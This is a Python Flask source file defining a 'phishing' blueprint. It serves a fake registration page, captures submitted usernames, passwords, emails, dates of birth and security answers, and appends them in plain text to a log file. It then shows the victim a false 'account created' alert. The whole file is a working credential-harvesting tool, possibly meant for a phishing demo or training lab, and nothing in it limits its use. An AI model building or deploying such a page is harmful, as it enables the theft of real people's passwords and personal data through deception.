import os
import re
from flask import Blueprint, request, jsonify, render_template, current_app

phishing_attack = Blueprint('phishing', __name__)

# Email validation regex
email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'


@phishing_attack.route('/fake_register', methods=['GET'])
def fake_register():
    return render_template('fake_register.html')

# Capture credentials submitted to the fake registration page
@phishing_attack.route('/capture_credentials', methods=['POST'])
def capture_credentials():

    username = request.form.get('username')
    password = request.form.get('password')
    email = request.form.get('email')
    password_repeat = request.form.get('password-repeat') 
    dob = request.form.get('dob')  
    security_question = request.form.get('security-question')
    security_answer = request.form.get('security-answer') 
    terms_accepted = request.form.get('terms') 

    if not re.match(email_regex, email):
        email = "Invalid email format"

    # Log captured credentials and additional data to a file
    log_file = os.path.join(current_app.root_path, 'phishing_credentials.log')
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"Captured credentials - Username: {username}, Password: {password}, Email: {email}, "
                f"Date of Birth: {dob}, Security Question: {security_question}, Answer: {security_answer}, "
                f"Terms Accepted: {terms_accepted}\n")

    # JavaScript alert
    return """
        <html>
            <head>
                <script type="text/javascript">
                    alert("Thank you for registering! Your account has been created.");
                </script>
            </head>
            <body>
                <p>Please wait while we redirect you...</p>
            </body>
        </html>
    """
